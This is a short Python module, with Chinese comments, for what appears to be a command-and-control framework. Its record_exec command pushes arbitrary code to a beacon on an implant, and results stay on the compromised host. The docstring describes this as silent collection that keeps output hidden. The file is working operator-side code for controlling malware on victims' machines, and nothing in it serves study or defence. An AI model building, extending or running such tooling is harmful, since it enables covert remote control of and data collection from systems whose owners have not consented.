"""record_exec — 下发"只记录不上报"的任务(record 型):

record_exec <beacon_id> <代码...>   任务在植入物执行, 结果只存本地
                                   (record 模块可查), 不主动回传 server

用于静默采集/不暴露输出的场景; 查看记录用 record 命令, 终止用
stop/kill_task 命令。
"""

from server.task_queue import Task


def run(disp, args):
    if not args:
        return "[!] usage: record_exec <beacon_id> <code...>"
    bid, code_parts = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon"
    if not code_parts:
        return "[!] usage: record_exec <beacon_id> <code...>"
    code = " ".join(code_parts)
    task = Task(code=code, record=True)
    r = disp.push_task(bid, task)
    return f"[+] 已下发记录型任务 → {bid}\n{r}"
